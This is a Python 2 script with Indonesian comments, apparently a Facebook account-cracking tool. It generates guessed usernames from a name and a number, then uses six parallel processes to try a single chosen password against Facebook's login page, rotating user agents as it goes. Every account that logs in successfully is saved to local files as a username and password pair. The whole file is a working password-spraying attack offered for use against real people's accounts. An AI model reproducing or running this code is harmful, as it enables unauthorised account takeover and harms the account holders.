# -*- coding UTF-8 -*-
#  Author : Iqbal Dev
#  Tools : Geli2 Efbeh
#  Versi : 0.1
#  Maaf ster Jika program saya masih acak2 dan terlalu sederhana

from brut_dev import brute
from prettytable import PrettyTable
from useragents import user_agents, baner, user_dev, divev, deviv
import os, sys, time, random, cookielib, mechanize, multiprocessing, subprocess
os.system('' if os.name == 'nt' else 'chmod +x *')
try:
    import mechanize

except ImportError:
    raw_input(" Kamu Blom Install Modul Mechanize..? \n Silahkan Tekan Enter Untuk Menginstall..")
    os.system('pip install mechanize' if os.name == 'nt' else 'pip2 install mechanize')
print "\033[96m"
p = []

def lup():
    pas = raw_input('\n\033[96;1m {\033[97;1m$\033[96;1m}\033[92;1m Pasword Yg Mngkin Digunakan, Cnth:\033[95;1m dinda123\n \033[97;1m => ')
    lip = open('pass.txt', 'w')
    lip.write(pas)
    lip.close()

    print "\n     Selamat Mencoba, Semoga Beruntung :) \n"

data1 = []
data2 = []
data3 = []
data4 = []
data5 = []
data6 = []

def user_efbeh():
  try:
    nam = raw_input("\n\033[96;1m {\033[97;1m@\033[96;1m}\033[92;1m Nama Facebook, Conth:\033[95;1m dinda maulia\n \033[97;1m => ")
    jum = input("\n\033[96;1m {\033[97;1m$\033[96;1m}\033[92;1m jumlah User Yg Mau Di Crack\033[97;1m (\033[95;1mmax=1000\033[97;1m):\n \033[93;1m => ")
    bag = jum / 6 + 1
    bag1 = bag + bag -1 
    bag2 = bag + bag1 -1 
    bag3 = bag2 + bag -1
    bag4 = bag3 + bag -1
    bag5 = bag4 + bag -1
    dev = nam.replace(' ', '.').replace('  ', '.')

    for has in range(1, bag):
        # print nam + ' ' + str(has)
        data1.append(dev+'.'+str(has))

    # print ''
    for has in range(bag, bag1):
        # print nam + ' ' + str(has)
        data2.append(dev+'.'+str(has)) 

    # print ''
    for has in range(bag1, bag2):
        # print nam + ' ' + str(has)
        data3.append(dev+'.'+str(has)) 

    # print ''
    for has in range(bag2, bag3):
        # print nam + ' ' + str(has)
        data4.append(dev+'.'+str(has)) 

    # print ''
    for has in range(bag3, bag4):
        # print nam + ' ' + str(has)
        data5.append(dev+'.'+str(has)) 

    # print ''
    for has in range(bag4, jum+1):
        # print nam + ' ' + str(has)
        data6.append(dev+'.'+str(has)) 
  except:
    sys.exit()

    # l = '\n'
    # print str(data1) + l + str(data2) + l + str(data3) + l + str(data4) + l + str(data5) + l + str(data6)
    # time.sleep(100)

passs = open('pass.txt', 'r').read()
#koneksi ke Browser
dev = mechanize.Browser()
ved = cookielib.LWPCookieJar()
dev.set_handle_robots(False)
dev.set_handle_referer(True)
dev.set_handle_redirect(True)
dev.set_handle_equiv(True)
dev.set_cookiejar(ved)
dev.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

lol = 'https://www.facebook.com/login.php?login_attempt=1'

a = '\033[96;1m'
p = '\033[97;1m'
k = '\033[93;1m'
h = '\033[92;1m'
b = '\033[94;1m'

def crack1(ival):
    passs = open('pass.txt', 'r').read()
    for us in ival:
      try:
        w = time.strftime("%Y-%m-%d %H:%S", time.localtime())
        print p+' ' + w + k + " ["+p+"1"+k+"]"+p+" | "+b+"Mencoba "+p+"==> "+ k + us
        dev.addheaders = [('User_agent', random.choice(user_agents))]
        url = dev.open(lol)
        dev.select_form(nr = 0)
        dev.form['email'] = us
        dev.form['pass'] = passs
        DEV = dev.submit()
        masuk = DEV.geturl()
        if masuk != lol and(not 'login_attempt' in masuk):
          try:  
            print a+'\n ['+p+'1'+a+']'+h+' Found '+ a + us + p +' | '+ h + passs + '\n'
            gas = open('hasil.txt', 'a')
            gas.write(us + ' | ' + passs + '\n')
            gas.close()
            has = open('word.txt', 'a')
            has.write(us + "\n")
            has.close()
          except:
            pass

      except:
        pass

def crack2(iqbal):
    passs = open('pass.txt', 'r').read()
    for user in iqbal:
      try:
        w = time.strftime("%Y-%m-%d %H:%S", time.localtime())
        print p+' ' + w + k + " ["+p+"2"+k+"]"+p+" | "+b+"Mencoba "+p+"==> "+ k + user
        dev.addheaders = [('User_agent', random.choice(user_agents))]
        url = dev.open(lol)
        dev.select_form(nr = 0)
        dev.form['email'] = user
        dev.form['pass'] = passs
        DEV = dev.submit()
        masuk = DEV.geturl()
        if masuk != lol and (not 'login_attempt' in masuk):
          try:
            print a+'\n ['+p+'2'+a+']'+h+' Found '+ a + user + p +' | '+ h + passs + '\n'
            gas = open('hasil.txt', 'a')
            gas.write(user + ' | ' + passs + '\n')
            gas.close()
            has = open('word.txt', 'a')
            has.write(user + '\n')
            has.close()
          except:
            pass
      except:
        pass

def crack3(dev_id):
    passs = open('pass.txt', 'r').read()
    for user3 in dev_id:
        try:
            w = time.strftime("%Y-%m-%d %H:%S", time.localtime())
            print p+' ' + w + k + " ["+p+"3"+k+"]"+p+" | "+b+"Mencoba "+p+"==> "+ k + user3
            dev.addheaders = [('User_agent', random.choice(user_agents))]
            url = dev.open(lol)
            dev.select_form(nr = 0)
            dev.form['email'] = user3
            dev.form['pass'] = passs
            DEV = dev.submit()
            masuk = DEV.geturl()
            if masuk != lol and (not 'login_attempt' in masuk):
              try:
                print a+'\n ['+p+'3'+a+']'+h+' Found '+ a + user3 + p +' | '+ h + passs + '\n'
                gas = open('hasil.txt', 'a')
                gas.write(user3 + ' | ' + passs + '\n')
                gas.close()
                has = open('word.txt', 'a')
                has.write(user3 +'\n')
                has.close()

              except:
                pass

        except:
            pass

# sdffffffffffffffffffffffffffffffffffffffffffffff
def crack4(ival1):
    passs = open('pass.txt', 'r').read()
    for us1 in ival1:
      try:
        w = time.strftime("%Y-%m-%d %H:%S", time.localtime())
        print p+' ' + w + k + " ["+p+"4"+k+"]"+p+" | "+b+"Mencoba "+p+"==> "+ k + us1
        dev.addheaders = [('User_agent', random.choice(user_agents))]
        url = dev.open(lol)
        dev.select_form(nr = 0)
        dev.form['email'] = us1
        dev.form['pass'] = passs
        DEV = dev.submit()
        masuk = DEV.geturl()
        if masuk != lol and(not 'login_attempt' in masuk):
          try:  
            print a+'\n ['+p+'4'+a+']'+h+' Found '+ a + us1 + p +' | '+ h + passs + '\n'
            gas = open('hasil.txt', 'a')
            gas.write(us1 + ' | ' + passs + '\n')
            gas.close()
            has = open('word.txt', 'a')
            has.write(us1 + "\n")
            has.close()
          except:
            pass

      except:
        pass

def crack5(iqbal2):
    passs = open('pass.txt', 'r').read()
    for user2 in iqbal2:
      try:
        w = time.strftime("%Y-%m-%d %H:%S", time.localtime())
        print p+' ' + w + k + " ["+p+"5"+k+"]"+p+" | "+b+"Mencoba "+p+"==> "+ k + user2
        dev.addheaders = [('User_agent', random.choice(user_agents))]
        url = dev.open(lol)
        dev.select_form(nr = 0)
        dev.form['email'] = user2
        dev.form['pass'] = passs
        DEV = dev.submit()
        masuk = DEV.geturl()
        if masuk != lol and (not 'login_attempt' in masuk):
          try:
            print a+'\n ['+p+'5'+a+']'+h+' Found '+ a + user2 + p +' | '+ h + passs + '\n'
            gas = open('hasil.txt', 'a')
            gas.write(user2 + ' | ' + passs + '\n')
            gas.close()
            has = open('word.txt', 'a')
            has.write(user2 + '\n')
            has.close()
          except:
            pass
      except:
        pass

def crack6(dev_id3):
    passs = open('pass.txt', 'r').read()
    for user6 in dev_id3:
        try:
            w = time.strftime("%Y-%m-%d %H:%S", time.localtime())
            print p+' ' + w + k + " ["+p+"6"+k+"]"+p+" | "+b+"Mencoba "+p+"==> "+ k + user6
            dev.addheaders = [('User_agent', random.choice(user_agents))]
            url = dev.open(lol)
            dev.select_form(nr = 0)
            dev.form['email'] = user6
            dev.form['pass'] = passs
            DEV = dev.submit()
            masuk = DEV.geturl()
            if masuk != lol and (not 'login_attempt' in masuk):
              try:
                print a+'\n ['+p+'6'+a+']'+h+' Found '+ a + user6 + p +' | '+ h + passs + '\n'
                gas = open('hasil.txt', 'a')
                gas.write(user6 + ' | ' + passs + '\n')
                gas.close()
                has = open('word.txt', 'a')
                has.write(user6 +'\n')
                has.close()

              except:
                pass

        except:
            pass
# hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
def hasil():
    print '\n \033[95;1m     Selesai....'
    pasw = open('pass.txt', 'r').read()
    hasil = open('word.txt', 'r').readlines()
    hasilku = open('word.txt', 'r' ).read()
    jml = len(hasil)
    dev_id = str(pasw) + '\n' 
    dev = dev_id * jml
    xev = PrettyTable()
    xev.field_names=["\033[97;1mUsername\033[96;1m", "\033[97;1mPassword\033[96;1m"]
    xev.add_row(['\033[92;1m'+hasilku+'\033[96;1m', '\033[92;1m'+dev+'\033[96;1m'])
    print '\033[96;1m'
    print xev
    deviv()
    divev()
    print '\n'

    
def run():
    jalan()
    try:
        th1 = multiprocessing.Process(target=crack1, args=(data1,))
        th2 = multiprocessing.Process(target=crack2, args=(data2,))
        th3 = multiprocessing.Process(target=crack3, args=(data3,))
        th4 = multiprocessing.Process(target=crack4, args=(data4,))
        th5 = multiprocessing.Process(target=crack5, args=(data5,))
        th6 = multiprocessing.Process(target=crack6, args=(data6,))
        th1.start()
        th2.start()
        th3.start()
        th4.start()
        th5.start()
        th6.start()
        th1.join()
        th2.join()
        th3.join()
        th4.join()
        th5.join()
        th6.join()

    except KeyboardInterrupt:
        hasil()
        sys.exit(' Keluar....')

    hasil()

def jalan():
    v = open('word.txt', 'w')
    v.write('')
    v.close()
    print user_dev
    user_efbeh()
    lup()
def ikuti():
    try:
        print "\n\n Silahkan Ikuti Akun Instagram saya IqbalDev :)"
        print "+----------------------------------------------+"
        raw_input("\n Tekan ENTER Untuk Membuka Instagram ....")
        subprocess.check_output(['am','start','https://www.instagram.com/iqbaldev/'])
        os.system("multi_dev.py" if os.name == "nt" else "python2 multi_dev.py")
    except:
        subprocess.check_output(['am','start','https://www.instagram.com/iqbaldev/'])
        os.system("multi_dev.py" if os.name == "nt" else "python2 multi_dev.py")

def iq():

    d = open('passs.txt', 'a')
    d.write('1')


if __name__ == '__main__':

    try:
      os.system('cls' if os.name == 'nt' else 'clear')
      print baner
      pil = raw_input("\033[96;1m {\033[95;1m?\033[96;1m}\033[92;1m Pilih Opsi\033[93;1m : ")
      if pil == '1':
          brute()
      elif pil == '2':
          run()
      elif pil == '3':
          ikuti()
      else:
          print "\n\033[91;1m Isi yg bener dodooolll... "

    except:
        sys.exit("\n Keluar....")

    
    # os.remove('hasil.txt')
